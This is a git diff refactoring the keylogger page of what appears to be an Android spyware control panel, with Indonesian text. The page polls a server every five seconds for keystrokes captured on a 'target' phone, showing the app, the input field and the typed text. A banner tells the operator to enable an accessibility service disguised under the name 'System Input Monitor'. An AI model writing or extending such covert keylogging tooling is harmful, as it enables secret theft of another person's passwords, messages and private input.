@@ -1,6 +1,7 @@
 'use client'
 import { useEffect, useState, useCallback } from 'react'
 import Sidebar from '@/components/Sidebar'
+import { useDevice } from '@/contexts/DeviceContext'
 import { KeySquare, RefreshCw, Trash2, Search } from 'lucide-react'
 
 interface Entry {
@@ -37,49 +38,34 @@ function timeAgo(iso: string) {
 }
 
 export default function KeylogPage() {
-  const [entries, setEntries]   = useState<Entry[]>([])
-  const [loading, setLoading]   = useState(true)
-  const [search, setSearch]     = useState('')
-  const [deviceId, setDeviceId] = useState<string | null>(null)
-  const [devices, setDevices]   = useState<{ deviceId: string; deviceName: string; connected: boolean }[]>([])
-
-  const fetchDevices = useCallback(async () => {
-    const res  = await fetch('/api/devices')
-    const data = await res.json()
-    const list = data.devices ?? []
-    setDevices(list)
-    if (!deviceId && list.length > 0) {
-      const online = list.find((d: { connected: boolean }) => d.connected) ?? list[0]
-      setDeviceId(online.deviceId)
-    }
-  }, [deviceId])
+  const { devices, selectedId, setSelectedId, connected } = useDevice()
+  const [entries, setEntries] = useState<Entry[]>([])
+  const [loading, setLoading] = useState(true)
+  const [search, setSearch]   = useState('')
 
   const fetchEntries = useCallback(async () => {
-    if (!deviceId) return
+    if (!selectedId) return
     setLoading(true)
     try {
-      const res  = await fetch(`/api/device/keylog?deviceId=${deviceId}&limit=500`)
+      const res  = await fetch(`/api/device/keylog?deviceId=${selectedId}&limit=500`)
       const data = await res.json()
       setEntries(data.entries ?? [])
     } finally { setLoading(false) }
-  }, [deviceId])
+  }, [selectedId])
 
   const clearAll = async () => {
-    if (!deviceId || !confirm('Hapus semua data keylogger?')) return
-    await fetch(`/api/device/keylog?deviceId=${deviceId}`, { method: 'DELETE' })
+    if (!selectedId || !confirm('Hapus semua data keylogger?')) return
+    await fetch(`/api/device/keylog?deviceId=${selectedId}`, { method: 'DELETE' })
     setEntries([])
   }
 
-  useEffect(() => { fetchDevices() }, [fetchDevices])
   useEffect(() => { fetchEntries() }, [fetchEntries])
 
-  // Auto-refresh every 5s
   useEffect(() => {
-    const t = setInterval(() => { if (deviceId) fetchEntries() }, 5000)
+    const t = setInterval(() => { if (selectedId) fetchEntries() }, 5000)
     return () => clearInterval(t)
-  }, [deviceId, fetchEntries])
+  }, [selectedId, fetchEntries])
 
-  const connected = devices.find(d => d.deviceId === deviceId)?.connected ?? false
   const filtered  = entries.filter(e =>
     e.appName.toLowerCase().includes(search.toLowerCase()) ||
     e.fieldName.toLowerCase().includes(search.toLowerCase()) ||
@@ -90,11 +76,10 @@ export default function KeylogPage() {
 
   return (
     <div className="flex min-h-screen">
-      <Sidebar connected={connected} devices={devices} selectedId={deviceId} onSelect={setDeviceId} />
+      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
       <main className="flex-1 page-content overflow-y-auto">
         <div className="max-w-3xl mx-auto px-4 md:px-6 py-4 md:py-6">
 
-          {/* Header */}
           <div className="flex items-center justify-between mb-4">
             <div>
               <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2">
@@ -112,10 +97,9 @@ export default function KeylogPage() {
             </div>
           </div>
 
-          {/* Setup banner — hanya tampil jika connected tapi belum ada data */}
           {connected && entries.length === 0 && !loading && (
             <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl text-xs text-android-yellow">
-              ⚠️ Pastikan <strong>System Input Monitor</strong> sudah diaktifkan:<br />
+              Pastikan <strong>System Input Monitor</strong> sudah diaktifkan:<br />
               Settings → Accessibility → Downloaded Apps → <strong>System Input Monitor</strong> → ON<br />
               <span className="text-android-muted mt-1 block">Jika sudah ON tapi kosong, coba ketik di app manapun di HP target.</span>
             </div>
@@ -126,7 +110,6 @@ export default function KeylogPage() {
             </div>
           )}
 
-          {/* Search */}
           <div className="relative mb-4">
             <Search size={14} className="absolute left-3 top-1/2 -translate-y-1/2 text-android-muted" />
             <input
@@ -138,7 +121,6 @@ export default function KeylogPage() {
             />
           </div>
 
-          {/* App filter pills */}
           {apps.length > 1 && (
             <div className="flex gap-2 overflow-x-auto pb-2 mb-4">
               <button onClick={() => setSearch('')} className={`shrink-0 px-3 py-1 rounded-full text-xs font-medium border transition-colors ${search === '' ? 'bg-android-red/10 border-android-red/40 text-android-red' : 'border-android-border text-android-muted hover:text-white'}`}>
@@ -152,7 +134,6 @@ export default function KeylogPage() {
             </div>
           )}
 
-          {/* Entry list */}
           {loading ? (
             <div className="text-center py-16 text-android-muted text-sm">Memuat…</div>
           ) : filtered.length === 0 ? (
@@ -174,9 +155,7 @@ export default function KeylogPage() {
                       <span className="text-xs text-android-muted shrink-0">{timeAgo(e.capturedAt)}</span>
                     </div>
                     {e.fieldName && (
-                      <p className="text-[10px] text-android-muted mb-0.5 font-mono">
-                        field: {e.fieldName}
-                      </p>
+                      <p className="text-[10px] text-android-muted mb-0.5 font-mono">field: {e.fieldName}</p>
                     )}
                     <p className="text-sm text-android-text font-mono break-all">{e.text}</p>
                   </div>
